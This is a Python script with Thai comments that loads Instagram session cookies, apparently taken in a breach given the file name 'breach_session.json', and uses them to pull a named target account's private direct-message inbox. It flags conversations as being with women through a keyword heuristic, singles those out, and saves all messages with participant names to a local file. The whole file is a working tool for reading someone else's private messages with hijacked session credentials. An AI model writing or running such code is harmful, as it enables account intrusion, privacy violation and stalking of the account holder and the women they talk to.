#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ดึงข้อมูลแชทจริงจาก session ที่มีอยู่
Extract real chat data from existing session
"""

import requests
import json
import time
from datetime import datetime

def load_session():
    """โหลด session ที่มีอยู่"""
    try:
        with open('session.json', 'r') as f:
            return json.load(f)
    except:
        try:
            with open('breach_session.json', 'r') as f:
                return json.load(f)
        except:
            return None

def create_session_with_data(session_data):
    """สร้าง requests session ด้วยข้อมูลที่มี"""
    
    session = requests.Session()
    
    # ตั้งค่า cookies
    session.cookies.set('sessionid', session_data.get('sessionid'))
    session.cookies.set('ds_user_id', session_data.get('ds_user_id'))
    
    # ตั้งค่า headers
    headers = {
        'User-Agent': 'Instagram 219.0.0.12.117 Android',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'X-IG-App-ID': '936619743392459',
        'X-IG-WWW-Claim': '0',
        'X-Requested-With': 'XMLHttpRequest',
    }
    
    session.headers.update(headers)
    return session

def get_direct_messages(session):
    """ดึงข้อความใน Direct Messages"""
    
    try:
        print("📬 กำลังดึงข้อความใน Direct Messages...")
        
        # URL สำหรับดึง DM
        url = "https://i.instagram.com/api/v1/direct_v2/inbox/"
        
        response = session.get(url)
        print(f"📥 Response status: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            
            inbox = data.get('inbox', {})
            threads = inbox.get('threads', [])
            
            print(f"💬 พบการสนทนา: {len(threads)} รายการ")
            
            conversations = []
            all_messages = []
            female_conversations = []
            
            for thread in threads:
                thread_id = thread.get('thread_id')
                thread_title = thread.get('thread_title', 'Unknown')
                
                # ดึงข้อมูลผู้ใช้ในการสนทนา
                users = thread.get('users', [])
                user_names = []
                is_female_thread = False
                
                for user in users:
                    username = user.get('username', 'Unknown')
                    full_name = user.get('full_name', '')
                    user_names.append(f"{username} ({full_name})" if full_name else username)
                    
                    # ตรวจสอบว่าเป็นผู้หญิงหรือไม่
                    if is_likely_female(username, full_name):
                        is_female_thread = True
                
                # ดึงข้อความล่าสุด
                items = thread.get('items', [])
                messages = []
                
                for item in items:
                    message_type = item.get('item_type')
                    timestamp = item.get('timestamp')
                    user_id = item.get('user_id')
                    
                    if message_type == 'text':
                        text = item.get('text', '')
                        messages.append({
                            'text': text,
                            'timestamp': timestamp,
                            'user_id': user_id,
                            'type': 'received' if str(user_id) != session.cookies.get('ds_user_id') else 'sent'
                        })
                    elif message_type == 'media':
                        messages.append({
                            'text': '[Media/Image]',
                            'timestamp': timestamp,
                            'user_id': user_id,
                            'type': 'received' if str(user_id) != session.cookies.get('ds_user_id') else 'sent'
                        })
                
                conversation_info = {
                    'thread_id': thread_id,
                    'title': thread_title,
                    'users': user_names,
                    'message_count': len(messages),
                    'last_activity': thread.get('last_activity_at'),
                    'messages': messages[:20],  # เก็บ 20 ข้อความล่าสุด
                    'is_female_conversation': is_female_thread
                }
                
                conversations.append(conversation_info)
                all_messages.extend(messages)
                
                if is_female_thread:
                    female_conversations.append(conversation_info)
                    print(f"  👩 {thread_title}: {len(messages)} ข้อความ (ผู้หญิง)")
                else:
                    print(f"  👤 {thread_title}: {len(messages)} ข้อความ")
                    
                print(f"      👥 ผู้ใช้: {', '.join(user_names)}")
            
            return {
                'conversations': conversations,
                'female_conversations': female_conversations,
                'total_messages': len(all_messages),
                'all_messages': all_messages
            }
            
        elif response.status_code == 401:
            print("❌ Session หมดอายุ หรือไม่ถูกต้อง")
            return None
        elif response.status_code == 429:
            print("⚠️ Rate limit - รอสักครู่แล้วลองใหม่")
            return None
        else:
            print(f"❌ ไม่สามารถดึงข้อมูลได้: {response.status_code}")
            print(f"Response: {response.text[:200]}...")
            return None
            
    except Exception as e:
        print(f"❌ เกิดข้อผิดพลาด: {e}")
        return None

def is_likely_female(username, full_name):
    """ตรวจสอบว่าน่าจะเป็นผู้หญิงหรือไม่"""
    
    female_indicators = [
        'girl', 'queen', 'princess', 'babe', 'baby', 'cutie', 'beauty', 'cute',
        'miss', 'lady', 'woman', 'female', 'her', 'she', 'goddess', 'angel',
        'น้อง', 'พี่', 'นาง', 'คุณ', 'มิส', 'สาว', 'ขาว', 'ดำ', 'แดง'
    ]
    
    text_to_check = f"{username} {full_name}".lower()
    
    for indicator in female_indicators:
        if indicator in text_to_check:
            return True
    
    return False

def save_real_chat_data(dm_data):
    """บันทึกข้อมูลแชทจริง"""
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"REAL_chat_data_alx.trading_{timestamp}.json"
    
    real_data = {
        'extraction_info': {
            'timestamp': datetime.now().isoformat(),
            'target_account': 'alx.trading',
            'data_type': 'REAL_INSTAGRAM_DATA',
            'source': 'direct_api_extraction_from_session'
        },
        'direct_messages': dm_data,
        'summary': {
            'total_conversations': len(dm_data.get('conversations', [])) if dm_data else 0,
            'female_conversations': len(dm_data.get('female_conversations', [])) if dm_data else 0,
            'total_messages': dm_data.get('total_messages', 0) if dm_data else 0
        }
    }
    
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(real_data, f, indent=2, ensure_ascii=False)
    
    print(f"💾 บันทึกข้อมูลจริงไว้ใน: {filename}")
    return filename

def main():
    print("📱 ดึงข้อมูลแชทจริงจาก Instagram")
    print("=" * 50)
    
    # โหลด session
    session_data = load_session()
    if not session_data:
        print("❌ ไม่พบไฟล์ session")
        return
    
    print(f"✅ โหลด session สำเร็จ")
    print(f"🆔 User ID: {session_data.get('ds_user_id')}")
    
    # สร้าง session
    session = create_session_with_data(session_data)
    
    # ดึงข้อมูล Direct Messages
    print("\n" + "="*50)
    dm_data = get_direct_messages(session)
    
    # บันทึกข้อมูล
    if dm_data:
        filename = save_real_chat_data(dm_data)
        
        print("\n📊 สรุปข้อมูลจริงที่ได้:")
        print("-" * 40)
        
        print(f"💬 การสนทนาทั้งหมด: {len(dm_data.get('conversations', []))} รายการ")
        print(f"👩 การสนทนากับผู้หญิง: {len(dm_data.get('female_conversations', []))} รายการ")
        print(f"📝 ข้อความทั้งหมด: {dm_data.get('total_messages', 0)} ข้อความ")
        
        # แสดงข้อมูลผู้หญิงที่พบ
        female_convs = dm_data.get('female_conversations', [])
        if female_convs:
            print(f"\n👩 ผู้หญิงที่คุยด้วย:")
            for conv in female_convs:
                print(f"   • {conv['title']}: {conv['message_count']} ข้อความ")
                print(f"     👥 {', '.join(conv['users'])}")
        
        print(f"\n🎯 ไฟล์ข้อมูลจริง: {filename}")
        print("✅ เสร็จสิ้น - นี่คือข้อมูลจริงจาก Instagram API!")
    else:
        print("\n❌ ไม่สามารถดึงข้อมูลได้")
        print("💡 Session อาจหมดอายุ หรือ Instagram บล็อค API")

if __name__ == "__main__":
    main()
